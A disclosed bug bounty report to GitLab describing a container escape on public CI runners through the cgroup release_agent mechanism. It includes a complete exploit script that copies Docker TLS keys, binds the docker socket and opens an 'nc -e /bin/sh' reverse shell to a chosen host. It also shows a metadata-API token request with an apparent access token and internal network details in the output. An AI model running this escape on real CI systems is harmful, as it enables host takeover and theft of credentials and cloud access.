# Container escape on public GitLab CI runners

## Report Details
- **Report ID**: 1442118
- **URL**: https://hackerone.com/reports/1442118
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-01-06T00:29:40.807Z
- **Disclosed**: 2022-04-27T11:12:25.142Z

## Reporter
- **Username**: ec0
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary

It is possible to circumvent the isolation in place for build jobs running on public CI runners by escaping the docker container running the build job.
This is possible via abuse of the cgroup release_agent functionality, made possible by CI jobs being allowed to mount filesystems inside the container.

From this host, I was able to spawn a root remote shell and run whatever I liked without restriction, including bypassing the iptables rules put in place to prevent access to the GCP metadata API. I was also able to gather sensitive data such as the instance token, GCP project ID and instance configuration, docker host TLS keys, firewall details, suricata configuration and user account names for the ops team, which could aid in further exploitation for a motivated attacker.

### Steps to reproduce

1. Sign up for a regular, free GitLab account.
2. Create a new project.
     An example repo is here: https://gitlab.com/ec0bb/citest (made private)
3. Add the below `.gitlab-ci.yaml`
```
image: python:latest
run:
  script:
    - bash shell.sh
```
4. Add the below `shell.sh`
```
export HOST=your.reverse.shell.box # customise this!

mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
export host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

touch /user/txt
touch /ca.pem
touch /server.pem
touch /server-key.pem
touch /ps.txt
echo '#!/bin/sh' > /cmd
echo "whoami > $host_path/user.txt" >> /cmd
echo "ps uax > $host_path/ps.txt" >> /cmd
echo "cat /etc/docker/ca.pem > $host_path/ca.pem" >> /cmd
echo "cat /etc/docker/server.pem > $host_path/server.pem" >> /cmd
echo "cat /etc/docker/server-key.pem > $host_path/server-key.pem" >> /cmd
echo "mount -o bind /var/run/docker.sock $host_path/docker.sock" >> /cmd
echo "/usr/bin/nc $HOST 1337 -e /bin/sh &" >> /cmd
chmod a+x /cmd

while test 1
do
  sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
  sleep 60
done
```
5. Push the files to the repository.
6. Enable CI/CD jobs on the repository, in case they aren't, using the `.gitlab-ci.yml` in the repository.
7. Set up a reverse shell listener with `nc -lvp 1337` on the host you specified in the bash script above.
8. Run the job

### Impact

Based on the host configuration, there is a clear expectation that CI jobs should not have access to the host, given the use of $DOCKER_USER in the firewall rules, and the configuration in place to prevent access to GCP metadata and host configuration in the way the container is configured. 

Being able to break this confinement allows for unconstrained resource usage on the CI host, as well as access to GCP resources and also other hosts on the internal GCP network.  It is also possible to disable iptables and suricata entirely - so arbitrary software and docker images can also be downloaded and run, to facilitate things like cryptocoin mining, something the host has been configured to try and prevent via iptables and suricata rules. This could be used by an attacker to consume significant compute resources in the form of bandwidth usage and compute time, given how easy it is to spin up multiple GitLab accounts, and to restart jobs programmatically when the maximum execution time is reached.

I did not see any evidence of shared jobs in my testing, however if multiple jobs were scheduled on a dedicated runner (which I did not test) then this could also lead to a loss of confidentiality between jobs, as the full container configuration and contents are accessible once the container is escaped.

### Examples

Repo: https://gitlab.com/ec0bb/citest

GCP access (albeit limited) -
```
curl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
{"access_token":"ya29.c.b0AXv0zTPHcDsuE3JOIVaFex7mGac13DuX3nI8XvoeSTANd0HfWmJ8BaTiE0P8GGRBVjOH3--Bangi4UVHqBpR7hLsfielnvZd5VWsRVM9xedCsFchJ1VlIl_RHRAgndu79QhAdEtquGQ9FVw8K_v-beS5zXMSh2DZNEfrUx6IgkAF3skn2sAkxg89XQm5gm067YQIAoaPlyI","expires_in":3326,"token_type":"Bearer"}

ya29.c.b0AXv0zTO_ny6xsfw0m5_YDMjdRUJbxx4jtnhEvrHEBghVmwDPL8GYx8UEQyB2spVmqtEy4IO_1kIONyCny-qwV7bi32okDSc8eNSTwXDUynLVayT3O0OiQ_FOCBlIMaU8Afx_Cbnr3xM7okiaMie0OWkRt4rHnYakWzXUZ_skTaLtN75GASDhs-mqFBe2LPFhj58eGf7DnFNk
token bb




instance/attributes/cos-update-strategy update_disabled
instance/attributes/sshKeys cos:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHZ9aaQ4+W
humgGQokzT+0zX+bS6AkSbs/JYeuoV8Sdb2cp88txEWoozuamR/S6MXp0lHF7hD2hmClvk5LESQLo9pe
FWXu8U1RZnYyN/pgAA3SpiLaWppxaEd5s5Ry/EXMLunbShenhpg05aby26wBHnBINU4ERITySAW362xT
zovivE+RA+yWUcuZUzpGTAGOeSqJpH7Gg4g86jMof7IG0Ybixt6LgRhK8tX6ryUw8eqWaAPwB4W/nQ6T
n2Eup21246PzVqMMhxo4O1dO2g7e2Jyqehvo7Yf5avc4kQ7h2LBrt033Esk1V5XFdzb++1kQxVkEUFor
wID4cGmMb0Av cos

instance/attributes/user-data #cloud-config

write_files:
- path: /etc/systemd/system/docker.service.d/20-run-binfmt-container.conf
  permissions: 0644
  owner: root
  content: |
    [Service]
    ExecStartPost=docker run --rm --privileged linuxkit/binfmt:v0.8

- path: /etc/systemd/system/docker.service.d/05-iptables-restore-wants.conf
  permissions: 0644
  owner: root
  content: |
    [Unit]
    Wants=network-online.target containerd.service iptables-restore.service
:
- path: /etc/systemd/system.conf
  permissions: 0644
  owner: root
  content: |
    [Manager]
    # Defaults from Google Container Optimized OS
    DefaultCPUAccounting=yes
    DefaultBlockIOAccounting=yes
    # Our custom timeout to speed-up VM shutdown
    # see: https://gitlab.com/gitlab-com/gl-infra/infrastructure/-/issues/13826#
note_632590419
    DefaultTimeoutStopSec=5s

- path: /var/lib/cloud/scripts/per-boot/00-enable-swap
  permissions: 0755
  owner: root
  content: |
    #!/usr/bin/env sh

    sysctl vm.disk_based_swap=1
    fallocate -l 2G /var/swapfile
    chmod 600 /var/swapfile
    mkswap /var/swapfile
    swapon /var/swapfile

- path: /var/lib/cloud/scripts/per-boot/01-configure-custom-sysctl
  permissions: 0755
  owner: root
  content: |
    #!/usr/bin/env sh

    # Required for Elasticsearch docker images to function:
    # https://gitlab.com/gitlab-com/infrastructure/issues/1687
    sysctl vm.max_map_count=262144

    # Swap is available, but not preferred
    sysctl vm.swappiness=10

instance/cpu-platform Intel Haswell
instance/description docker host vm
instance/disks/0/device-name persistent-disk-0
instance/disks/0/index 0
instance/disks/0/interface SCSI
instance/disks/0/mode READ_WRITE
instance/disks/0/type PERSISTENT
instance/hostname runner-jlguopmm-shared-1641423520-3feb5440.c.gitlab-ci-plan-fr
ee-6-f2de7a.internal
instance/id 8450900684160343118
instance/image projects/gitlab-ci-155816/global/images/runners-cos-stable-v20210
720-0
instance/legacy-endpoint-access/0.1 0
instance/legacy-endpoint-access/v1beta1 0
instance/licenses/0/id 6880041984096540132
instance/licenses/1/id 1001010
instance/licenses/2/id 166739712233658766
instance/machine-type projects/745008255720/machineTypes/n1-standard-1
instance/maintenance-event NONE
instance/name runner-jlguopmm-shared-1641423520-3feb5440
instance/network-interfaces/0/access-configs/0/external-ip 35.185.3.50
instance/network-interfaces/0/access-configs/0/type ONE_TO_ONE_NAT
instance/network-interfaces/0/dns-servers 169.254.169.254
instance/network-interfaces/0/gateway 10.10.8.1
instance/network-interfaces/0/ip 10.10.10.75
instance/network-interfaces/0/mac 42:01:0a:0a:0a:4b
instance/network-interfaces/0/mtu 1460
instance/network-interfaces/0/network projects/745008255720/networks/ephemeral-r
unners
instance/network-interfaces/0/subnetmask 255.255.248.0
instance/preempted FALSE
instance/remaining-cpu-time -1
instance/scheduling/automatic-restart TRUE
instance/scheduling/on-host-maintenance MIGRATE
instance/scheduling/preemptible FALSE
instance/service-accounts/default/aliases default
instance/service-accounts/default/email ephemeral-runner@gitlab-ci-plan-free-6-f
2de7a.iam.gserviceaccount.com
instance/service-accounts/default/scopes https://www.googleapis.com/auth/logging
.write
instance/service-accounts/default/scopes https://www.googleapis.com/auth/monitor
ing.write
instance/service-accounts/ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gser
viceaccount.com/aliases default
instance/service-accounts/ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gser
viceaccount.com/email ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gservice
account.com
instance/service-accounts/ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gser
viceaccount.com/scopes https://www.googleapis.com/auth/logging.write
instance/service-accounts/ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gser
viceaccount.com/scopes https://www.googleapis.com/auth/monitoring.write
instance/tags docker-machine
instance/virtual-clock/drift-token 0
instance/zone projects/745008255720/zones/us-east1-c
project/attributes/disable-legacy-endpoints TRUE
project/attributes/serial-port-logging-enable false
project/numeric-project-id 745008255720
project/project-id gitlab-ci-plan-free-6-f2de7a

computeMetadata/v1/instance/service-accounts/default/scopes \  
>     -H 'Metadata-Flavor:Google'
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
```

docker access
```
root@runner-jlguopmm-shared-1641423520-3feb5440 /etc # docker ps
CONTAINER ID        IMAGE                                                      COMMAND                  CREATED             STATUS              PORTS               NAMES
a40074c0d2c5        a5d7930b60cc                                               "sh -c 'if [ -x /usr…"   25 minutes ago      Up 25 minutes                           runner-jlguopmm-project-27556964-concurrent-0-1abba63760b4a3af-build-2
8c1dbc222094        quay.io/gitlab/gitlab-runner-docker-cleanup:latest         "go-wrapper run"         5 months ago        Up 26 minutes                           gitlab-runner-docker-cleanup
fa185f65bc99        registry.gitlab.com/gitlab-org/ci-cd/suricata-runner:0.3   "/sbin/init"             5 months ago        Up 26 minutes                           suricata
17e19eb0ac0b        quay.io/prometheus/node-exporter:v1.0.1                    "/bin/node_exporter …"   5 months ago        Up 26 minutes                           node-exporter
```

runner TLS keys for communicating with the runner manager (also used for logstash auth)
```
root@runner-jlguopmm-shared-1641423520-3feb5440 /etc # file /mnt/stateful_partition/assets/ssl/*
runner.ca.crt:     PEM certificate
runner.client.crt: PEM certificate
runner.client.key: PEM RSA private key
```

## Impact

Unconfined remote code execution on CI host machines
Access to GCP API
Access to internal GCP network

## Attachments
No attachments
